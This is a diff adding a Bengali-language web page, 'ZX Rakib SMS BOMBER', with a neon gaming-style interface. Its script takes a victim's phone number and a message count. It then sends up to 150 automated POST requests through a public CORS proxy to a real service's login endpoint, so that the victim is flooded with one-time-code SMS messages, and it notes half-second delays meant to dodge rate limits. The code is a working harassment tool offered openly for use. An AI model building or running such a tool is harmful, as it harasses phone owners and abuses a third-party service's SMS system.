@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>ZXSMS BOMBER </title>
+    <!-- Google Fonts & Gaming vibe -->
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03050b);
+            font-family: 'Inter', 'Orbitron', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        /* ---------- অনিমেটেড ব্যাকগ্রাউন্ড (গেমিং ভাইব) ---------- */
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+
+        .cyber-grid {
+            position: absolute;
+            width: 200%;
+            height: 200%;
+            top: -50%;
+            left: -50%;
+            background-image: 
+                linear-gradient(rgba(0, 255, 255, 0.08) 1px, transparent 1px),
+                linear-gradient(90deg, rgba(0, 255, 255, 0.08) 1px, transparent 1px);
+            background-size: 50px 50px;
+            animation: gridMove 20s linear infinite;
+            transform: rotate(5deg);
+        }
+
+        @keyframes gridMove {
+            0% {
+                transform: translate(0, 0) rotate(5deg);
+            }
+            100% {
+                transform: translate(50px, 50px) rotate(5deg);
+            }
+        }
+
+        .glowing-orbs {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+        }
+
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(70px);
+            opacity: 0.4;
+            animation: floatOrb 15s infinite alternate ease-in-out;
+        }
+
+        .orb1 { width: 300px; height: 300px; background: #ff00cc; top: -100px; left: -100px; animation-duration: 18s; }
+        .orb2 { width: 400px; height: 400px; background: #00ffff; bottom: -150px; right: -100px; animation-duration: 22s; animation-delay: 2s; }
+        .orb3 { width: 250px; height: 250px; background: #ff6600; top: 50%; left: 70%; animation-duration: 25s; opacity: 0.3; }
+        .orb4 { width: 350px; height: 350px; background: #3a0ca3; bottom: 20%; left: -10%; animation-duration: 20s; filter: blur(90px); }
+
+        @keyframes floatOrb {
+            0% { transform: translate(0, 0) scale(1); }
+            100% { transform: translate(80px, 60px) scale(1.2); }
+        }
+
+        .pulse-line {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: linear-gradient(90deg, cyan, magenta, cyan);
+            animation: linePulse 3s infinite;
+        }
+
+        @keyframes linePulse {
+            0% { opacity: 0.3; width: 0%; left: 0%; }
+            50% { opacity: 1; width: 100%; left: 0%; }
+            100% { opacity: 0.3; width: 0%; left: 100%; }
+        }
+
+        /* ---------- মূল কার্ড - গেমিং স্টাইল (নিয়ন + গ্লাস) ---------- */
+        .game-card {
+            position: relative;
+            z-index: 10;
+            background: rgba(10, 20, 30, 0.75);
+            backdrop-filter: blur(14px);
+            border-radius: 36px;
+            border: 1px solid rgba(0, 255, 255, 0.4);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8), 0 0 20px rgba(0, 255, 255, 0.2), inset 0 1px 0 rgba(255,255,255,0.1);
+            width: 100%;
+            max-width: 540px;
+            transition: all 0.3s;
+        }
+
+        .card-inner {
+            padding: 32px 28px;
+        }
+
+        /* হেডার - গেমিং টাচ */
+        .brand-header {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        .icon-badge {
+            background: linear-gradient(135deg, #ff00cc, #00ffff);
+            width: 80px;
+            height: 80px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 18px;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.6), 0 8px 20px rgba(0,0,0,0.5);
+            animation: iconGlow 2s infinite alternate;
+        }
+        @keyframes iconGlow {
+            0% { box-shadow: 0 0 10px cyan, 0 0 20px magenta; }
+            100% { box-shadow: 0 0 25px magenta, 0 0 35px cyan; }
+        }
+        .icon-badge i {
+            font-size: 42px;
+            color: white;
+            filter: drop-shadow(0 0 5px black);
+        }
+        h1 {
+            font-family: 'Orbitron', monospace;
+            font-size: 2rem;
+            font-weight: 800;
+            background: linear-gradient(125deg, #00ffff, #ff00cc);
+            background-clip: text;
+            -webkit-background-clip: text;
+            color: transparent;
+            letter-spacing: 1px;
+            text-shadow: 0 0 8px rgba(0,255,255,0.5);
+        }
+        .sub {
+            font-size: 0.75rem;
+            font-weight: 600;
+            background: rgba(0, 255, 255, 0.2);
+            display: inline-block;
+            padding: 5px 16px;
+            border-radius: 40px;
+            color: #0ff;
+            letter-spacing: 1px;
+            backdrop-filter: blur(4px);
+            border: 0.5px solid cyan;
+            margin-top: 12px;
+        }
+
+        /* ইনপুট ফিল্ড - নিয়ন এজ */
+        .input-group {
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .input-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            font-size: 0.85rem;
+            color: #bbffff;
+            margin-bottom: 10px;
+            font-family: 'Orbitron', monospace;
+            letter-spacing: 0.5px;
+        }
+        .input-label i {
+            color: #0ff;
+            text-shadow: 0 0 3px cyan;
+        }
+        input {
+            width: 100%;
+            padding: 14px 20px;
+            font-size: 1rem;
+            font-weight: 500;
+            background: rgba(0, 0, 0, 0.65);
+            border: 1.5px solid #2c5f7a;
+            border-radius: 28px;
+            color: #0ff;
+            font-family: 'Inter', monospace;
+            transition: all 0.2s;
+            outline: none;
+            backdrop-filter: blur(4px);
+        }
+        input:focus {
+            border-color: #ff00cc;
+            box-shadow: 0 0 15px rgba(255, 0, 204, 0.5), 0 0 5px cyan;
+            color: #fff;
+        }
+        input::placeholder {
+            color: #5f7f9a;
+            font-weight: 400;
+        }
+
+        /* গেমিং বাটন - নিয়ন মোশন */
+        .btn-send {
+            background: linear-gradient(95deg, #ff00cc, #00ffff);
+            border: none;
+            padding: 16px 20px;
+            width: 100%;
+            border-radius: 60px;
+            font-weight: 800;
+            font-size: 1.1rem;
+            font-family: 'Orbitron', monospace;
+            color: #010101;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 0 12px cyan, 0 5px 15px rgba(0,0,0,0.6);
+            letter-spacing: 1px;
+        }
+        .btn-send:hover {
+            transform: scale(1.02);
+            box-shadow: 0 0 25px magenta, 0 0 18px cyan;
+            background: linear-gradient(95deg, #00ffff, #ff00cc);
+            letter-spacing: 2px;
+        }
+        .btn-send:active {
+            transform: scale(0.98);
+        }
+
+        /* লগ টার্মিনাল (সাইবার পাঙ্ক) */
+        .log-container {
+            margin-top: 30px;
+            background: #03050cee;
+            border-radius: 24px;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            overflow: hidden;
+            box-shadow: 0 0 12px rgba(0,255,255,0.2);
+        }
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 18px;
+            background: rgba(0, 20, 40, 0.7);
+            border-bottom: 1px solid cyan;
+        }
+        .log-header span {
+            font-family: 'Orbitron', monospace;
+            font-weight: 600;
+            font-size: 0.75rem;
+            color: #0ff;
+            text-shadow: 0 0 3px cyan;
+        }
+        .clear-log {
+            background: none;
+            border: none;
+            color: #ff66cc;
+            cursor: pointer;
+            font-size: 0.75rem;
+            transition: all 0.2s;
+            font-weight: bold;
+        }
+        .clear-log:hover {
+            color: #ff00ff;
+            text-shadow: 0 0 5px magenta;
+        }
+        #log {
+            font-family: 'Courier New', 'Fira Code', monospace;
+            font-size: 0.75rem;
+            background: #01040cee;
+            color: #0ffb9c;
+            padding: 16px 18px;
+            max-height: 220px;
+            min-height: 130px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-word;
+            line-height: 1.5;
+            text-shadow: 0 0 2px #0ff;
+        }
+        #log::-webkit-scrollbar {
+            width: 5px;
+        }
+        #log::-webkit-scrollbar-track {
+            background: #131f2c;
+        }
+        #log::-webkit-scrollbar-thumb {
+            background: #0ff;
+            border-radius: 10px;
+        }
+
+        .footer-note {
+            text-align: center;
+            font-size: 0.65rem;
+            color: #66aaff;
+            margin-top: 20px;
+            border-top: 1px dashed rgba(0, 255, 255, 0.3);
+            padding-top: 15px;
+            font-family: monospace;
+        }
+        .disabled-btn {
+            opacity: 0.6;
+            pointer-events: none;
+            filter: grayscale(0.3);
+        }
+        .spinner {
+            display: inline-block;
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(0,0,0,0.3);
+            border-radius: 50%;
+            border-top-color: black;
+            animation: spin 0.6s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        @media (max-width: 520px) {
+            .card-inner { padding: 24px 18px; }
+            h1 { font-size: 1.6rem; }
+        }
+        /* গেমিং এলিমেন্টে মিনি অনুরণন */
+        .glitch-text {
+            animation: glitch 1s infinite;
+        }
+    </style>
+</head>
+<body>
+
+<!-- ব্যাকগ্রাউন্ড অ্যানিমেশন (গেমিং থিম) -->
+<div class="animated-bg">
+    <div class="cyber-grid"></div>
+    <div class="glowing-orbs">
+        <div class="orb orb1"></div>
+        <div class="orb orb2"></div>
+        <div class="orb orb3"></div>
+        <div class="orb orb4"></div>
+    </div>
+    <div class="pulse-line"></div>
+</div>
+
+<div class="game-card">
+    <div class="card-inner">
+        <div class="brand-header">
+            <div class="icon-badge">
+                <i class="fas fa-gamepad"></i>
+            </div>
+            <h1>ZX Rakib <span style="background: linear-gradient(125deg,#ff00cc,#00ffff); background-clip:text; -webkit-background-clip:text; color:transparent;">SMS BOMBER</span></h1>
+            <div class="sub"><i class="fas fa-bolt"></i> VIP MODE ACTIVE <i class="fas fa-robot"></i></div>
+        </div>
+
+        <div class="input-group">
+            <div class="input-label">
+                <i class="fas fa-mobile-alt"></i> 
+                <span>টার্গেট নম্বর</span>
+            </div>
+            <input type="tel" id="phone" placeholder="例如: 01xxxxxxxx / +8801..." autocomplete="off">
+        </div>
+
+        <div class="input-group">
+            <div class="input-label">
+                <i class="fas fa-bomb"></i>
+                <span>🔥 মেসেজ কাউন্ট (আক্রমণ ভলিউম)</span>
+            </div>
+            <input type="number" id="count" placeholder="কয়টি রিকোয়েস্ট মারবেন?" min="1" max="120" value="5">
+        </div>
+
+        <button class="btn-send" id="sendBtn" onclick="startSending()">
+            <i class="fas fa-skull-crossbones"></i> 
+            <span>💀 START BLAST 💀</span>
+        </button>
+
+        <div class="log-container">
+            <div class="log-header">
+                <span><i class="fas fa-terminal"></i> >> CYBER CONSOLE LOG</span>
+                <button class="clear-log" id="clearLogBtn" onclick="clearLog()"><i class="fas fa-trash-alt"></i> CLEAR</button>
+            </div>
+            <div id="log">[🟢] SYSTEM BOOTING... <br> [⚡] VIP MOD প্রস্তুত। নম্বর ও ডোজ সেট করুন।</div>
+        </div>
+        <div class="footer-note">
+            <i class="fas fa-shield-haltered"></i> API রেট লিমিট এড়াতে 0.5s ডিলে | CORS প্রোক্সি সক্রিয়
+        </div>
+    </div>
+</div>
+
+<script>
+    // ---------- কোর লজিক সম্পূর্ণ অপরিবর্তিত (পাইথন ভিত্তিক) ----------
+    let isSendingActive = false;
+
+    async function startSending() {
+        if (isSendingActive) {
+            appendLog("[⛔] ওহো! আরেকটি প্রক্রিয়া ইতিমধ্যে সক্রিয়!", "error");
+            return;
+        }
+
+        let phoneInput = document.getElementById('phone');
+        let countInput = document.getElementById('count');
+        let phone = phoneInput.value.trim();
+        let count = parseInt(countInput.value);
+
+        if (!phone) {
+            alert("❌ গেম ওভার! নম্বর দিতে হবে!");
+            return;
+        }
+        if (isNaN(count) || count <= 0) {
+            alert("❌ আক্রমণ সংখ্যা সঠিক দিন (1 থেকে 120)");
+            return;
+        }
+        if (count > 150) {
+            alert("⚡ ম্যাক্স ১৫০ রিকোয়েস্ট অনুমোদিত। সেট করা হয়েছে 150.");
+            count = 150;
+            countInput.value = 150;
+        }
+
+        // ফরম্যাটিং পাইথন স্টাইল: +88 যুক্ত করা original logic
+        let formattedPhone = phone;
+        if (!formattedPhone.startsWith("+88")) {
+            if (formattedPhone.startsWith("0")) {
+                formattedPhone = "+88" + formattedPhone;
+            } else if (!formattedPhone.startsWith("+")) {
+                formattedPhone = "+88" + formattedPhone;
+            }
+        }
+
+        const endpointUrl = "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en";
+        const proxyUrl = "https://corsproxy.io/?";
+        
+        isSendingActive = true;
+        const sendButton = document.getElementById('sendBtn');
+        sendButton.classList.add('disabled-btn');
+        const originalBtnHTML = sendButton.innerHTML;
+        sendButton.innerHTML = `<span class="spinner"></span> █▬█ ᴍɪssɪᴏɴ ɪɴ ᴘʀᴏɢʀᴇss █▬█`;
+
+        appendLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+        appendLog(`🎯 টার্গেট লোক: ${formattedPhone} | শট: ${count} বার`, "info");
+        appendLog(`🌐 API + প্রোক্সি সিকিউর মোড`, "info");
+
+        let successCount = 0;
+        let errorCount = 0;
+
+        for (let i = 1; i <= count; i++) {
+            try {
+                const fetchUrl = proxyUrl + encodeURIComponent(endpointUrl);
+                const response = await fetch(fetchUrl, {
+                    method: 'POST',
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ "number": formattedPhone })
+                });
+                const responseText = await response.text();
+                let shortResponse = responseText.length > 55 ? responseText.substring(0, 55) + "…" : responseText;
+                
+                if (response.ok) {
+                    successCount++;
+                    appendLog(`🎉 [${i}/${count}] হিট সফল! (${response.status}) রেসপন্স: ${shortResponse}`, "success");
+                } else {
+                    errorCount++;
+                    appendLog(`⚠️ [${i}/${count}] মিস! HTTP ${response.status} → ${shortResponse}`, "error");
+                }
+                await new Promise(resolve => setTimeout(resolve, 500));
+            } catch (err) {
+                errorCount++;
+                appendLog(`💀 [${i}/${count}] নেটওয়ার্ক ব্লাস্ট ব্যর্থ: ${err.message.substring(0, 70)}`, "error");
+                await new Promise(resolve => setTimeout(resolve, 450));
+            }
+        }
+        
+        appendLog(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
+        if (successCount > 0) {
+            appendLog(`🏆 অভিযান শেষ! সফল আঘাত: ${successCount} ❤️‍🔥 ব্যর্থ: ${errorCount}`, "success");
+        } else {
+            appendLog(`💔 সম্পূর্ণ ব্যর্থ! ${errorCount} টি অনুরোধ ব্যর্থ হয়েছে।`, "error");
+        }
+        
+        sendButton.classList.remove('disabled-btn');
+        sendButton.innerHTML = originalBtnHTML;
+        isSendingActive = false;
+        const logDiv = document.getElementById('log');
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+    
+    function appendLog(message, type = "info") {
+        const logDiv = document.getElementById('log');
+        const now = new Date();
+        const timestamp = `${now.getHours().toString().padStart(2,'0')}:${now.getMinutes().toString().padStart(2,'0')}:${now.getSeconds().toString().padStart(2,'0')}`;
+        let icon = "💠";
+        if (type === "success") icon = "✨";
+        if (type === "error") icon = "⚠️";
+        const logLine = `[${timestamp}] ${icon} ${message}`;
+        logDiv.innerHTML += logLine + "\n";
+        logDiv.scrollTop = logDiv.scrollHeight;
+        
+        // clean extremely large log (performant)
+        if (logDiv.innerHTML.length > 8000) {
+            let lines = logDiv.innerHTML.split('\n');
+            if (lines.length > 250) {
+                let keep = lines.slice(-200).join('\n');
+                logDiv.innerHTML = keep;
+            }
+        }
+    }
+    
+    function clearLog() {
+        const logDiv = document.getElementById('log');
+        logDiv.innerHTML = "[🧹] কমান্ডার, লগ ক্লিয়ার করা হয়েছে।\n[💀] নতুন আক্রমণের জন্য প্রস্তুত!\n";
+        appendLog("লগ সাফ করা হয়েছে, রেডি ফর একশন", "info");
+    }
+    
+    document.getElementById('count').addEventListener('keypress', function(e) {
+        if(e.key === 'Enter') startSending();
+    });
+    document.getElementById('phone').addEventListener('keypress', function(e) {
+        if(e.key === 'Enter') document.getElementById('count').focus();
+    });
+    
+    window.addEventListener('load', () => {
+        document.getElementById('phone').focus();
+        appendLog("🚀 গেমিং ইন্টারফেস লোডেড। নিয়ন রেডি!", "success");
+    });
+</script>
+
+</body>
+</html>
